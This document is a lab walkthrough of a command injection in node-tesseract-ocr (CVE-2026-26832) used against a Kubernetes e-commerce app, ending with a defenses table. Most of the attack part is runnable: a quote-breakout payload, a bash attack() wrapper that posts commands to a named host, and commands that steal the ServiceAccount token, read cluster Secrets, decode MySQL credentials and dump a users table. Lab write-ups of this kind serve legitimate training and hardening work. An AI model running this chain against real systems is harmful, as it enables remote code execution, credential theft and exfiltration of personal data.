# Attack scenario — CVE-2026-26832 (OS Command Injection)

> 🌐 **English** · [Tiếng Việt](./attack-scenario.vi.md)

> ⚠️ **WARNING**: This document is for **educational** purposes and testing in **your own isolated lab** only. Do not target any real/unauthorized system.

## Overview

| Item | Value |
|------|-------|
| **Vulnerability** | CVE-2026-26832 — OS Command Injection |
| **Affected component** | `node-tesseract-ocr` <= 2.2.1 |
| **Endpoint** | `POST /api/products/scan-label` |
| **Target (lab)** | `https://ecommerce.vdevopssphere.ddnsfree.com` |
| **Impact** | RCE → steal SA token → call kube-apiserver → read Secret → pivot to MySQL and exfiltrate data |

## Attack chain (Kill Chain)

```
[1] RCE via the OCR endpoint
      │  child_process.exec() does not sanitize imagePath
      ▼
[2] Read the ServiceAccount token (default automount)
      │  /var/run/secrets/kubernetes.io/serviceaccount/token
      ▼
[3] Call the kube-apiserver with the token
      │  Over-broad RBAC → list namespaces / pods cluster-wide
      ▼
[4] Read the Secret in the `database` namespace
      │  .data holds MySQL creds (base64, NOT encrypted)
      ▼
[5] Pivot to MySQL (no NetworkPolicy in the way)
      │  mysql client already present in the image
      ▼
[6] Exfiltrate the entire `users` table (PII)  ← end goal
```

---

## Vulnerability analysis

The `/api/products/scan-label` endpoint builds a shell command:

```
tesseract "<imagePath>" stdout -l eng ...
```

and passes it straight into `child_process.exec()` **without sanitization**. Since the attacker controls `imagePath`, they can break out of the string and inject arbitrary commands.

### Payload structure

| Component | Meaning |
|-----------|---------|
| `"` | Closes the double quote tesseract wraps around `imagePath` (breaks out of the argument) |
| `>/dev/null 2>&1` | Discards the empty tesseract command's output/errors to keep things clean |
| `; <command>` | Runs the attacker's arbitrary command |
| `#` | Comments out the trailing `" stdout -l eng ..."` remainder |

The final payload injected into the `imagePath` field:

```
" >/dev/null 2>&1; <YOUR_COMMAND> #
```

---

## The tool: the `attack()` function

The function sends an arbitrary shell command into the `shop-app` pod through the vulnerability. `jq -n --arg` builds JSON safely (auto-escaping), so there's no need to hand-escape quotes. The app returns the result in the `text` field (success) or `error`.

```bash
attack() {
  jq -n --arg c "\" >/dev/null 2>&1; $1 #" '{imagePath:$c}' \
    | curl -s -X POST "https://ecommerce.vdevopssphere.ddnsfree.com/api/products/scan-label" \
        -H 'Content-Type: application/json' -d @- \
    | jq -r '.text // .error'
}
```

---

## Exploitation steps

### Step 1 — Grab the ServiceAccount token

Default automount → the token sits right inside the pod.

```bash
TOKEN=$(attack "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
```

### Step 2 — Call the kube-apiserver via the default service DNS

> `curl` runs **inside** the pod, `jq` runs **on your machine** (the pod doesn't need jq).

**List all namespaces** — proves the token can read cluster resources:

```bash
attack "curl -sk -H 'Authorization: Bearer $TOKEN' https://kubernetes.default.svc/api/v1/namespaces" \
  | jq -r '.items[] | "\(.metadata.name)"'
```

**List pods cluster-wide** — over-broad RBAC, visible across every namespace:

```bash
attack "curl -sk -H 'Authorization: Bearer $TOKEN' https://kubernetes.default.svc/api/v1/pods" \
  | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)"'
```

### Step 3 — Read the Secret in the `database` namespace

**List secret names** (metadata only, for brevity):

```bash
attack "curl -sk -H 'Authorization: Bearer $TOKEN' https://kubernetes.default.svc/api/v1/namespaces/database/secrets" \
  | jq -r '.items[].metadata | "\(.namespace)/\(.name)"'
```

**Read the secret's `.data`** — the DB password value (base64, not encrypted):

```bash
attack "curl -sk -H 'Authorization: Bearer $TOKEN' https://kubernetes.default.svc/api/v1/namespaces/database/secrets" \
  | jq -r '.items[].data'
```

**List services in `database`** — find the `mysql-svc` endpoint to pivot to:

```bash
attack "curl -sk -H 'Authorization: Bearer $TOKEN' https://kubernetes.default.svc/api/v1/namespaces/database/services" \
  | jq -r '.items[].metadata | "\(.namespace)/\(.name)"'
```

### Step 4 — Decode credentials (base64 ≠ encryption)

```bash
DBPASS=$(echo U2gwcEFwcCFEYlBhc3M= | base64 -d)   # MYSQL_PASSWORD
DBUSER=$(echo c2hvcGFwcA==         | base64 -d)   # MYSQL_USER
DBNAME=$(echo c2hvcA==             | base64 -d)   # MYSQL_DATABASE

echo $DBPASS $DBUSER $DBNAME
```

### Step 5 — Pivot to MySQL & exfiltrate data

From **inside** the app pod, connect straight to MySQL (no NetworkPolicy in the way). The `mysql` client is already in the image (`default-mysql-client` shipped with it) → pivot to the DB in another namespace.

```bash
# List tables
attack "mysql -h mysql-svc.database.svc.cluster.local -u $DBUSER -p$DBPASS $DBNAME -e 'show tables;'"

# Exfiltrate the entire users table (fake PII) — the end of the attack chain
attack "mysql -h mysql-svc.database.svc.cluster.local -u $DBUSER -p$DBPASS $DBNAME -e 'SELECT * FROM users;'"
```

---

## Lessons & defenses

| Exploited weakness | Mitigation |
|--------------------|------------|
| `exec()` without input sanitization | Use `execFile()`/arg arrays; validate & escape input; upgrade `node-tesseract-ocr` |
| Default SA token automount | Set `automountServiceAccountToken: false` when the pod doesn't need the API |
| Over-broad RBAC | Apply least-privilege; scope by namespace/resource |
| Base64 (unencrypted) Secret | Enable encryption-at-rest; use an external secret manager (Vault, SealedSecrets) |
| No NetworkPolicy | Apply NetworkPolicy to block east-west traffic between namespaces |
| MySQL client baked into the image | Use a minimal image (distroless), drop unneeded tools |
| No runtime detection | Deploy Falco to detect anomalous behavior (reading the SA token, spawning shells...) |
